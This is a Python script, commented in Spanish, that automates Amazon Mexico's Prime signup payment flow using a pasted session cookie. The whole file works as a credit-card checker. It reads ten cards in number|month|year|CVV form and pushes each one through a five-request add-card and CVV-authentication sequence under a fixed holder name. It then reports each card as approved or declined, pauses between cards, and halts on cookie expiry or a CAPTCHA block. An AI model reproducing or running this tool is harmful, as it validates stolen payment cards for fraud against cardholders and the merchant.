import requests
import re
import json
import time

def verificar_cookie(session, cookie_input):
    print("Verificando el estado de la cookie antes de procesar las tarjetas...")
    try:
        headers_base = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'es-MX,es;q=0.9,en;q=0.8',
            'cookie': cookie_input,
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36',
            'device-memory': '8', 'downlink': '1.5', 'dpr': '1', 'ect': '4g',
            'referer': 'https://www.amazon.com.mx/amazonprime?ref_=nav_cs_primelink_nonmember',
            'rtt': '100', 'sec-ch-device-memory': '8', 'sec-ch-dpr': '1',
            'sec-ch-ua': '"Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"',
            'sec-ch-ua-full-version-list': '"Chromium";v="152.0.7977.65", "Not?A_Brand";v="24.0.0.0", "Google Chrome";v="152.0.7977.65"',
            'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '19.0.0', 'sec-ch-viewport-width': '891',
            'upgrade-insecure-requests': '1', 'viewport-width': '891'
        }

        url_setup = "https://www.amazon.com.mx/gp/prime/pipeline/membersignup?campaignId=SlashPrime&offerToken=amzn1.prime.offertoken.1.C1GlssMHddF-l_7xcm603iUO5HLU4OuqNoYWDIG2dPvlHNHXGwxOURyZPLyuNsHYU9dVNs5I93vN8-isIS45hU4ue7h-hzg2pZ-1jyWjfQLYReH5Nl1Bdzux2VOj1KdsdD4e8r3ORNoUQn_yQ7WL-wFXDGM9zBx_PPMZeywQ68w17ojGhW86-foErA6xV5T5nx5kWDcbMwJ38sGxCEDSYvtiTyoY9qwo4DvhWf8hBdEyKoFnmgm3bjuzahmsCofJSfI0wUehe2PJKXPeRtF2XYtJiZval8j-LXumf0hgFO1I8-sXDuyL0WzPa3UW631AhsfBzEdMRID1h3EciHoRw7jfQdQdgLGIaaIN8LA&redirectURL=L2dwL3ByaW1l&locationID=prime_confirm&cancelRedirectURL=Lw&containerRequestId=df82f354-9a36-480c-a142-3bd11791ce45_25cfefeb-44ad-44b6-8dd3-a6a573c1ae22&originalContainerRequestId=df82f354-9a36-480c-a142-3bd11791ce45_25cfefeb-44ad-44b6-8dd3-a6a573c1ae22&primeSignupFulfillmentType=AMAZON_WALLET"
        
        response = session.get(url_setup, headers=headers_base)
        
        if response.status_code == 401:
            return False, "Error 401: Unauthorized. La cookie ha expirado o es inválida."
        
        widgetstate_pattern = r'name=&amp;quot;ppw-widgetState&amp;quot; value=&amp;quot;(.*?)&amp;quot;'
        customer_id_pattern = r'"customerID":\s*"([^"]+)"'
        
        widgetstate_match = re.search(widgetstate_pattern, response.text)
        customer_id_match = re.search(customer_id_pattern, response.text)
        
        if not widgetstate_match or not customer_id_match:
            if "Try different image" in response.text or " Please prove" in response.text:
                 return False, "CAPTCHA detectado o la cuenta ha sido bloqueada temporalmente. Inténtalo más tarde o verifica tu cuenta."
            return False, "No se pudo obtener widgetState o customer_id. La cookie puede no ser válida o la estructura de la página ha cambiado."
        
        return True, "Cookie válida."

    except requests.exceptions.RequestException as e:
        return False, f"Error de conexión al verificar la cookie: {e}"

def process_single_card_full_flow(session, card_data, card_index, cookie_input):
    card_number_raw, month, year, cvv = card_data

    card_number_display = ""
    for i, digit in enumerate(card_number_raw):
        if i > 0 and i % 4 == 0:
            card_number_display += " "
        card_number_display += digit

    print(f"\n========================================")
    print(f"--- INICIANDO PROCESO COMPLETO PARA TARJA #{card_index}: {card_number_display} ---")
    print(f"========================================")
    
    try:
        print(f"Llamada 1 (Tarja #{card_index}): Obteniendo tokens y customer_id frescos...")
        headers_base = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'es-MX,es;q=0.9,en;q=0.8',
            'cookie': cookie_input,
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36',
            'device-memory': '8', 'downlink': '1.5', 'dpr': '1', 'ect': '4g',
            'referer': 'https://www.amazon.com.mx/amazonprime?ref_=nav_cs_primelink_nonmember',
            'rtt': '100', 'sec-ch-device-memory': '8', 'sec-ch-dpr': '1',
            'sec-ch-ua': '"Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"',
            'sec-ch-ua-full-version-list': '"Chromium";v="152.0.7977.65", "Not?A_Brand";v="24.0.0.0", "Google Chrome";v="152.0.7977.65"',
            'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '19.0.0', 'sec-ch-viewport-width': '891',
            'upgrade-insecure-requests': '1', 'viewport-width': '891'
        }
        
        url_setup = "https://www.amazon.com.mx/gp/prime/pipeline/membersignup?campaignId=SlashPrime&offerToken=amzn1.prime.offertoken.1.C1GlssMHddF-l_7xcm603iUO5HLU4OuqNoYWDIG2dPvlHNHXGwxOURyZPLyuNsHYU9dVNs5I93vN8-isIS45hU4ue7h-hzg2pZ-1jyWjfQLYReH5Nl1Bdzux2VOj1KdsdD4e8r3ORNoUQn_yQ7WL-wFXDGM9zBx_PPMZeywQ68w17ojGhW86-foErA6xV5T5nx5kWDcbMwJ38sGxCEDSYvtiTyoY9qwo4DvhWf8hBdEyKoFnmgm3bjuzahmsCofJSfI0wUehe2PJKXPeRtF2XYtJiZval8j-LXumf0hgFO1I8-sXDuyL0WzPa3UW631AhsfBzEdMRID1h3EciHoRw7jfQdQdgLGIaaIN8LA&redirectURL=L2dwL3ByaW1l&locationID=prime_confirm&cancelRedirectURL=Lw&containerRequestId=df82f354-9a36-480c-a142-3bd11791ce45_25cfefeb-44ad-44b6-8dd3-a6a573c1ae22&originalContainerRequestId=df82f354-9a36-480c-a142-3bd11791ce45_25cfefeb-44ad-44b6-8dd3-a6a573c1ae22&primeSignupFulfillmentType=AMAZON_WALLET"
        
        response = session.get(url_setup, headers=headers_base)
        response.raise_for_status()
        
        widgetstate_pattern = r'name=&amp;quot;ppw-widgetState&amp;quot; value=&amp;quot;(.*?)&amp;quot;'
        customer_id_pattern = r'"customerID":\s*"([^"]+)"'
        
        widgetstate_match = re.search(widgetstate_pattern, response.text)
        customer_id_match = re.search(customer_id_pattern, response.text)
        
        if not widgetstate_match or not customer_id_match:
            return f"Fallo Tarjeta #{card_index}: No se pudo obtener widgetState o customer_id iniciales. La cookie ha expirado o la cuenta está bloqueada. Deteniendo proceso."

        initial_widgetstate = widgetstate_match.group(1)
        customer_id = customer_id_match.group(1)
        print(f"WidgetState y CustomerID iniciales obtenidos para tarjeta #{card_index}.")

        print(f"Llamada 2 (Tarjeta #{card_index}): Enviando widgetState al endpoint /cpe/pm/register...")
        headers_post = headers_base.copy()
        headers_post.update({
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type': 'application/x-www-form-urlencoded', 'host': 'apx-security.amazon.com.mx'
        })
        
        payload_post = {'widgetState': initial_widgetstate, 'clientId': 'Subs:Prime', 'creatablePaymentMethods': 'CC'}
        register_response = session.post("https://apx-security.amazon.com.mx/cpe/pm/register", headers=headers_post, data=payload_post)
        
        if register_response.status_code == 401:
            return f"Fallo Tarjeta #{card_index}: Error 401. La cookie ha expirado o la cuenta está bloqueada. Deteniendo proceso."
        
        register_response.raise_for_status()
        
        new_widgetstate_pattern = r'name="ppw-widgetState" value="(.*?)"'
        new_widgetstate_match = re.search(new_widgetstate_pattern, register_response.text)
        
        if not new_widgetstate_match:
            return f"Fallo Tarjeta #{card_index}: No se pudo obtener nuevo widgetState."

        new_widgetstate = new_widgetstate_match.group(1)

        print(f"Llamada 3 (Tarjeta #{card_index}): Identificando tipo de tarjeta ({card_number_display})...")
        headers3 = headers_base.copy()
        headers3.update({
            'accept': 'application/json, text/javascript, */*; q=0.01', 'apx-widget-info': 'Subs:Prime/desktop/hWicBq5sHWjA',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'host': 'apx-security.amazon.com.mx',
            'origin': 'https://apx-security.amazon.com.mx', 'referer': 'https://apx-security.amazon.com.mx/cpe/pm/register',
        })
        
        payload3 = {
            'ppw-jsEnabled': 'true', 'addCreditCardNumber': card_number_display,
            'ppw-widgetEvent': 'IdentifyCreditCardEvent', 'ppw-widgetState': new_widgetstate
        }
        
        continue_url = f"https://apx-security.amazon.com.mx/payments-portal/data/widgets2/v1/customer/{customer_id}/continueWidget"
        continue_response = session.post(continue_url, headers=headers3, data=payload3)

        if continue_response.status_code == 401:
            return f"Fallo Tarjeta #{card_index}: Error 401. La cookie ha expirado o la cuenta está bloqueada. Deteniendo proceso."
            
        continue_response.raise_for_status()
        
        widgetstate_pattern4 = r'"widgetState":"(.*?)"'
        widgetstate_match4 = re.search(widgetstate_pattern4, continue_response.text)
        latest_global_widgetstate = widgetstate_match4.group(1) if widgetstate_match4 else new_widgetstate
        print(f"WidgetState final obtenido para tarjeta #{card_index}.")

        print(f"Llamada 4 (Tarjeta #{card_index}): Registrando tarjeta...")
        headers4 = headers3.copy()
        headers4.update({'apx-widget-info': 'Subs:Prime/desktop/jtWlQJzJawL3'})
        
        payload4 = {
            'ppw-widgetEvent': 'AddCreditCardEvent', 'ppw-jsEnabled': 'true',
            'ppw-widgetState': latest_global_widgetstate, 'ie': 'UTF-8',
            'ppw-accountHolderName': "OLIMPO MEDINA", 'addCreditCardNumber': card_number_display,
            'ppw-expirationDate_month': month, 'ppw-expirationDate_year': year,
            'addCreditCardVerificationNumber': cvv, 'ppw-addCreditCardVerificationNumber_isRequired': 'true',
            '__sif_encrypted_hba_account_holder_name': "OLIMPO MEDINA", 'ppw-issuer': 'Unknown'
        }
        
        register_url4 = f"https://apx-security.amazon.com.mx/payments-portal/data/widgets2/v1/customer/{customer_id}/continueWidget?sif_profile=APX-Encrypt-All-NA"
        register_response4 = session.post(register_url4, headers=headers4, data=payload4)

        if register_response4.status_code == 401:
            return f"Fallo Tarjeta #{card_index}: Error 401. La cookie ha expirado o la cuenta está bloqueada. Deteniendo proceso."

        register_response4.raise_for_status()
        
        response_json = register_response4.json()
        auth_source_id = response_json.get('additionalWidgetResponseData', {}).get('additionalData', {}).get('authenticationSourceId')
        if not auth_source_id:
            return f"Fallo Tarjeta #{card_index}: No se pudo obtener authenticationSourceId."

        html_content = response_json.get('htmlContent', '')
        options_pattern = r'var options = ({.*?});'
        options_match = re.search(options_pattern, html_content, re.DOTALL)
        
        if not options_match:
            return f"Fallo Tarjeta #{card_index}: Objeto options no encontrado en Llamada 4."

        options_text = options_match.group(1)
        clean_pattern = r'false","clientId":"Subs:Prime","serializedState":"([^\"]*)","marketplaceId"'
        match = re.search(clean_pattern, options_text)
        
        if not match:
            return f"Fallo Tarjeta #{card_index}: serializedState no encontrado en Llamada 4."
            
        clean_serialized_state = match.group(1)
        print(f"SerializedState único y authenticationSourceId obtenidos para tarjeta #{card_index}")

        print(f"Llamada 5 (Tarjeta #{card_index}): Enviando solicitud de verificación...")
        headers5 = headers4.copy()
        
        payload5 = {
            'ppw-jsEnabled': 'true', 'ppw-widgetEvent': 'CVVAuthenticateEvent',
            'ppw-widgetState': clean_serialized_state,
            'ppw-authenticationSourceId': auth_source_id
        }
        
        verify_url5 = f"https://apx-security.amazon.com.mx/payments-portal/data/widgets2/v1/customer/{customer_id}/continueWidget"
        verify_response = session.post(verify_url5, headers=headers5, data=payload5)

        if verify_response.status_code == 401:
            return f"Fallo Tarjeta #{card_index}: Error 401. La cookie ha expirado o la cuenta está bloqueada. Deteniendo proceso."

        verify_response.raise_for_status()

        with open(f'verification_response_card_{card_index}.html', 'w', encoding='utf-8') as f:
            f.write(verify_response.text)
        
        verify_json = verify_response.json()
        
        if 'additionalWidgetResponseData' not in verify_json:
            return f"Fallo Tarjeta #{card_index}: Respuesta de verificación inválida."

        additional_data = verify_json['additionalWidgetResponseData'].get('additionalData', {})
        status = additional_data.get('status', 'Unknown')
        print(f"Estado inicial de verificación (Tarjeta #{card_index}): {status}")
        
        attempts = 0
        max_attempts = 4
        
        while status == 'PENDING' and attempts < max_attempts:
            attempts += 1
            print(f"Realizando intento de verificación #{attempts} para tarjeta #{card_index}...")
            time.sleep(3)
            
            verify_response_retry = session.post(verify_url5, headers=headers5, data=payload5)

            if verify_response_retry.status_code == 401:
                return f"Fallo Tarjeta #{card_index}: Error 401. La cookie ha expirado o la cuenta está bloqueada. Deteniendo proceso."

            verify_response_retry.raise_for_status()
            
            try:
                verify_json_retry = verify_response_retry.json()
                if 'additionalWidgetResponseData' in verify_json_retry:
                    additional_data_retry = verify_json_retry['additionalWidgetResponseData'].get('additionalData', {})
                    status = additional_data_retry.get('status', 'Unknown')
                    print(f"Estado después del intento #{attempts} (Tarjeta #{card_index}): {status}")
                    
                    with open(f'verification_attempt_{attempts}_card_{card_index}.html', 'w', encoding='utf-8') as f:
                        f.write(verify_response_retry.text)
                    
                    if status != 'PENDING':
                        break
            except Exception as e:
                print(f"Error en el intento #{attempts} para tarjeta #{card_index}: {e}")
        
        final_status = status
        final_message = f"Estado final de verificación (Tarjeta #{card_index}): {final_status}"
        if final_status == 'APPROVED': final_message += "\n¡Tarjeta aprobada exitosamente!"
        elif final_status == 'DECLINED': final_message += "\n¡La tarjeta fue declinada!"
        elif final_status == 'PENDING': final_message += f"\nLa tarjeta sigue en estado PENDING después de {attempts} intentos."
        else: final_message += f"\nEstado de verificación final desconocido: {final_status}"
        
        return f"Tarjeta #{card_index} ({card_number_display}): {final_status}"

    except requests.exceptions.RequestException as e:
        if "401" in str(e):
            return f"Fallo Tarjeta #{card_index}: Error 401. La cookie ha expirado o la cuenta está bloqueada. Deteniendo proceso."
        return f"\nError de solicitud al procesar tarjeta #{card_index}: {e}"
    except Exception as e:
        return f"\nError inesperado al procesar tarjeta #{card_index}: {e}"


if __name__ == "__main__":
    cookie_input = input("Por favor, introduce tu cookie de Amazon.com.mx: ")

    session = requests.Session()

    is_valid, message = verificar_cookie(session, cookie_input)
    if not is_valid:
        print(f"\n========================================")
        print(f"ERROR DE VERIFICACIÓN DE COOKIE: {message}")
        print("Se detiene el proceso por una cookie no válida. Por favor, obtén una nueva cookie y vuelve a intentarlo.")
        print(f"========================================\n")
        exit()
    else:
        print(f"Verificación de cookie exitosa: {message}")


    print("\nPor favor, introduce las 10 tarjetas, una por línea, en el formato: numero|mes|año|cvv")
    cards_data = []
    for i in range(10):
        while True:
            card_input = input(f"Tarjeta #{i+1}: ").strip()
            parts = card_input.split('|')
            if len(parts) == 4 and all(part.strip() for part in parts):
                cards_data.append([part.strip() for part in parts])
                break
            else:
                print("Error: Formato incorrecto. Inténtalo de nuevo. Debe ser numero|mes|año|cvv")
    
    results = []
    
    for i, card_data in enumerate(cards_data, start=1):
        result = process_single_card_full_flow(session, card_data, i, cookie_input)
        results.append(result)
        print(result)
        
        if "expirado" in result.lower() or "bloqueada" in result.lower() or "401" in result:
            print("\n========================================")
            print("ERROR CRÍTICO: Se detectó que la cookie ha expirado o la cuenta está bloqueada.")
            print("El proceso se detendrá para no continuar con una sesión inválida.")
            print("========================================")
            break
        
        if i < 10:
            print("\nEsperando 7 segundos antes de procesar la siguiente tarjeta...")
            time.sleep(7)
        
    print("\n=== RESUMEN FINAL ===")
    for i, result in enumerate(results, start=1):
        print(f"--- {result} ---")
    
    print("\nProceso completado.")